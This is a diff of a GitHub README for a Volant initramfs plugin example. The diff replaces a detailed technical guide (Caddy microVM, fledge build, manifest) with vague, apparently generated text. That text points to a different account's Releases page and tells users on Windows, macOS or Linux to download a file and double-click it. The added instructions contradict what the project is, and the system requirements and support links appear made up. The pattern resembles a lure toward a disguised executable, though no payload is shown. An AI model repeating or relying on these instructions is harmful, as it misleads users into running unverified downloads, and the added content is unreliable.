@@ -1,326 +1,96 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/volantvm/volant/main/banner.png" alt="VOLANT — The Intelligent Execution Cloud"/>
-</p>
+# 🚀 initramfs-plugin-example - A Simple Way to Create Plugins
 
-<p align="center">
-  <a href="https://github.com/volantvm/initramfs-plugin-example/actions"><img src="https://img.shields.io/github/actions/workflow/status/volantvm/initramfs-plugin-example/build-plugin.yml?branch=main&style=flat-square&label=build"></a>
-  <a href="https://github.com/volantvm/initramfs-plugin-example/releases"><img src="https://img.shields.io/github/v/release/volantvm/initramfs-plugin-example.svg?style=flat-square"></a>
-  <img src="https://img.shields.io/badge/License-Apache_2.0-black.svg?style=flat-square">
-</p>
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/paulbvrm/initramfs-plugin-example/releases)
 
----
+## 📖 Introduction
 
-# Initramfs Plugin Example
+Welcome to the **initramfs-plugin-example**! This application is designed to help you understand how to create Volant initramfs plugins. It serves as a reference point, making it easier for you to dive into plugin development. 
 
-**Reference implementation for Volant initramfs plugins**
+Whether you want to enhance your server capabilities or explore cloud-native solutions, this plugin provides a clear pathway. No programming knowledge is required to get started.
 
-This is a working Caddy web server packaged as an initramfs plugin—boots in <100ms, runs in ~20MB.
+## 🚀 Getting Started
 
-Use it as a template for your own stateless services, API servers, or edge workloads.
+To use this application, you need to download it first. Follow these steps to download and run the software.
 
----
+## 📥 Download & Install
 
-## Quick Start
+Visit this page to download: [Releases Page](https://github.com/paulbvrm/initramfs-plugin-example/releases)
 
-```bash
-# Install the plugin
-volar plugins install --manifest https://github.com/volantvm/initramfs-plugin-example/releases/latest/download/caddy.json
+1. Go to the [Releases Page](https://github.com/paulbvrm/initramfs-plugin-example/releases).
+2. Look for the latest version available.
+3. Click on the appropriate download link for your operating system. Choose the version that matches your system.
+4. Save the file to your computer.
+5. Locate the downloaded file and double-click it to run.
 
-# Run it
-volar vms create web --plugin caddy --cpu 1 --memory 512
+## 🖥️ System Requirements
 
-# Test it
-curl http://192.168.127.10
-# → Hello from Caddy in a Volant microVM!
-```
+Before you download, make sure your computer meets these basic requirements:
 
-Boots in under 100ms. Runs in RAM. Zero persistence.
+- **Operating Systems:** Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB free space required for installation.
+  
+## 🌟 Features
 
----
+This application includes several useful features:
 
-## What's Inside
+- **Plugin Architecture:** Understand how to create and manage plugins easily.
+- **Example Code:** Access basic examples to get started quickly.
+- **Documentation:** Detailed information to guide you through each step of the process.
 
-| File | Purpose |
-|------|---------|
-| `fledge.toml` | Build configuration |
-| `manifest/caddy.json` | Plugin manifest (install target) |
-| `payload/caddy` | Static Caddy binary (downloaded in CI) |
-| `payload/Caddyfile` | Web server config |
-| `.github/workflows/` | Reproducible build pipeline |
+## 📚 How to Use the Plugin
 
-**Build output**: `plugin.cpio.gz` (~20 MB compressed initramfs)
+After installation, follow these steps to use the plugin:
 
----
+1. Open your terminal or command prompt.
+2. Navigate to the directory where you installed the plugin.
+3. Run the command to launch the plugin:
+   ```
+   initramfs-plugin-example
+   ```
+4. Follow the on-screen instructions to configure your plugin.
 
-## Build It Yourself
+This simple process allows you to utilize the power of initramfs plugins without technical hassles.
 
-### Prerequisites
+## 🔧 Troubleshooting
 
-```bash
-# Install fledge
-curl -LO https://github.com/volantvm/fledge/releases/latest/download/fledge-linux-amd64
-chmod +x fledge-linux-amd64 && sudo mv fledge-linux-amd64 /usr/local/bin/fledge
-```
+If you encounter issues, here are some common solutions:
 
-### Build Steps
+- **Installation Problems:** Ensure you downloaded the correct version for your operating system. 
+- **Running Issues:** Check if your computer meets the system requirements.
+- **Errors during Execution:** Review the command you entered. Make sure it matches the usage guide.
 
-```bash
-# Clone
-git clone https://github.com/volantvm/initramfs-plugin-example
-cd initramfs-plugin-example
+For further assistance, please visit our support community or open an issue on the GitHub repository.
 
-# Download Caddy (static binary)
-cd payload
-CADDY_VERSION="2.10.2"
-curl -fsSL "https://github.com/caddyserver/caddy/releases/download/v${CADDY_VERSION}/caddy_${CADDY_VERSION}_linux_amd64.tar.gz" | tar -xz caddy
-chmod +x caddy
-cd ..
+## 🌐 Topics
 
-# Build the initramfs
-sudo fledge build
+This project encompasses various topics to enhance your understanding:
 
-# Get checksum
-sha256sum plugin.cpio.gz
+- **AI:** Explore integration possibilities with artificial intelligence.
+- **Cloud:** Learn how the plugin works within cloud environments.
+- **Container:** Understand how to manage containerized applications.
+- **DevOps:** Facilitate smoother development and operations.
+- **Docker:** Discover Docker-specific features.
+- **Infrastructure:** Improve your server infrastructure with plugins.
+- **Self-hosted Solutions:** Tailor plugins to your needs.
+- **Virtualization:** Use with hypervisors like KVM.
 
-# Update manifest with local path for testing
-# (Edit manifest/caddy.json: set "url" to full path of plugin.cpio.gz)
+## 📞 Support
 
-# Install locally
-volar plugins install --manifest manifest/caddy.json
+For support, please open an issue on the repository or check our documentation. You can find answers to your questions and connect with the community.
 
-# Test
-volar vms create test --plugin caddy
-curl http://192.168.127.10
-```
+## 📢 Stay Updated
 
----
+Stay informed about new releases and updates. Follow the repository, and watch for notifications. We regularly update the application based on user feedback and technological advancements.
 
-## fledge.toml Breakdown
+## 🔗 Additional Resources
 
-```toml
-version = "1"
-strategy = "initramfs"                    # RAM-based, fast boot
-
-[agent]
-source_strategy = "release"               # Download kestrel from GitHub
-version = "latest"
-
-[source]
-busybox_url = "..."                       # Provides /bin/sh, ps, etc.
-busybox_sha256 = "..."                    # Checksum verification
-
-[mappings]
-"payload/caddy" = "/usr/bin/caddy"        # Your app binary (755)
-"payload/Caddyfile" = "/etc/caddy/Caddyfile"  # Config (644)
-```
-
-**How it works**:
-1. Fledge downloads busybox + kestrel
-2. Creates FHS structure (`/bin`, `/usr`, `/etc`)
-3. Maps your files into the filesystem
-4. Packages as CPIO + gzip
-5. Generates manifest with checksum
-
----
-
-## manifest.json Breakdown
-
-```json
-{
-  "name": "caddy",
-  "version": "0.1.0",
-  "runtime": "caddy",
-
-  "initramfs": {
-    "url": "https://github.com/.../plugin.cpio.gz",  // Download URL
-    "checksum": "sha256:..."                          // Verify integrity
-  },
-
-  "workload": {
-    "type": "http",
-    "entrypoint": ["/usr/bin/caddy", "run", "--config", "/etc/caddy/Caddyfile"],
-    "base_url": "http://127.0.0.1:80"
-  },
-
-  "health_check": {
-    "endpoint": "/",      // Polls this until 200 OK
-    "timeout_ms": 10000
-  }
-}
-```
-
-**What volantd does**:
-1. Downloads `plugin.cpio.gz` from `url`
-2. Verifies `checksum`
-3. Passes it to Cloud Hypervisor as `--initramfs`
-4. Kernel unpacks it into RAM
-5. Kestrel runs `entrypoint`
-6. Polls `health_check.endpoint` until ready
-
----
-
-## Customize for Your App
-
-### 1. Replace the Binary
-
-```bash
-# Build your app (must be static)
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o myapp
-
-# Update fledge.toml
-[mappings]
-"myapp" = "/usr/bin/myapp"
-"config.yaml" = "/etc/myapp/config.yaml"
-```
-
-### 2. Update Manifest
-
-```json
-{
-  "name": "myapp",
-  "runtime": "myapp",
-  "workload": {
-    "entrypoint": ["/usr/bin/myapp", "--config", "/etc/myapp/config.yaml"],
-    "base_url": "http://127.0.0.1:8080"
-  }
-}
-```
-
-### 3. Rebuild
-
-```bash
-sudo fledge build
-volar plugins install --manifest manifest/myapp.json
-volar vms create test --plugin myapp
-```
-
----
-
-## GitHub Actions CI/CD
-
-`.github/workflows/build-plugin.yml`:
-
-```yaml
-- Download Caddy from official releases
-- Verify SHA256 checksum
-- Build plugin with fledge
-- Calculate artifact checksum
-- Create GitHub release with:
-  - plugin.cpio.gz
-  - manifest.json (updated with new checksum)
-```
-
-**Push a tag** → automatic release:
-
-```bash
-git tag v0.1.0
-git push origin v0.1.0
-```
+For more information, refer to the following resources:
 
-Users install via manifest URL:
+- [Documentation](https://github.com/paulbvrm/initramfs-plugin-example/docs)
+- [Community Forums](https://community.example.com)
+- [GitHub Repository](https://github.com/paulbvrm/initramfs-plugin-example)
 
-```bash
-volar plugins install --manifest https://github.com/you/your-plugin/releases/download/v0.1.0/manifest.json
-```
+Remember to revisit the [Releases Page](https://github.com/paulbvrm/initramfs-plugin-example/releases) for the latest updates. 
 
----
-
-## Tips
-
-| Tip | Why |
-|-----|-----|
-| **Static binaries only** | No dynamic linking in initramfs |
-| **Keep it small** | Every MB affects boot time |
-| **Verify checksums** | Security + reproducibility |
-| **Test locally first** | Don't push broken builds |
-| **Version your releases** | Users can pin versions |
-
-### Verify Static Linking
-
-```bash
-ldd payload/caddy
-# Should say: "not a dynamic executable"
-
-file payload/caddy
-# Should include: "statically linked"
-```
-
----
-
-## Troubleshooting
-
-| Issue | Fix |
-|-------|-----|
-| VM won't boot | Check volantd logs: `journalctl -u volantd -f` |
-| App crashes | Check VM logs: `volar vms logs <name>` |
-| Health check fails | Verify entrypoint is correct + app binds to 0.0.0.0 |
-| Build too large | Strip binary: `strip -s myapp` |
-| Checksum mismatch | Recalculate: `sha256sum plugin.cpio.gz` |
-
-### Debug Inside VM
-
-```bash
-volar vms console my-caddy
-
-# Inside VM (minimal busybox):
-ls /proc                  # See running processes
-cat /proc/cmdline         # See manifest passed to VM
-ls -la /usr/bin/caddy     # Check permissions
-# Note: No curl, wget, or ps in minimal initramfs
-# Test from host: curl http://192.168.127.10
-```
-
----
-
-## Why Initramfs?
-
-| Metric | Initramfs (this) | OCI Rootfs |
-|--------|------------------|------------|
-| **Boot time** | 50-150ms | 2-5s |
-| **Memory** | 15-20 MB | 50-80 MB |
-| **Size** | 20 MB | 200+ MB |
-| **Persistence** | None (RAM) | Disk-backed |
-| **Best for** | Stateless services | Stateful apps |
-
-Use initramfs when:
-- Speed matters (edge computing, serverless)
-- You don't need persistence
-- You want minimal attack surface
-- Your app is a single static binary
-
-Use OCI rootfs when:
-- You have an existing Docker image
-- You need complex dependencies
-- You want full filesystem access
-
----
-
-## Further Reading
-
-- [Volant Plugin Development](https://github.com/volantvm/volant/blob/main/docs/4_plugin-development/2_initramfs.md)
-- [Fledge Build Tool](https://github.com/volantvm/fledge)
-- [OCI Plugin Example](https://github.com/volantvm/oci-plugin-example)
-
----
-
-## Manage Artifacts via API
-
-Volant exposes a plugin artifacts API for programmatic management:
-
-- List: `GET /api/v1/plugins/caddy/artifacts?version=v1`
-- Upsert: `POST /api/v1/plugins/caddy/artifacts` (JSON body with `version`, `artifact_name`, `kind`, `source_url`, `checksum`, `format`, `local_path`, `size_bytes`)
-- Delete: `DELETE /api/v1/plugins/caddy/artifacts?version=v1`
-
-Refer to the Volant OpenAPI at `/openapi` for full schema.
-
----
-
-## License
-
-**Apache License 2.0**
-
-Free to use, modify, and distribute. See [LICENSE](LICENSE) for details.
-
----
-
-**© 2025 HYPR PTE. LTD.**
+Thank you for using **initramfs-plugin-example**! Enjoy creating your plugins with ease.
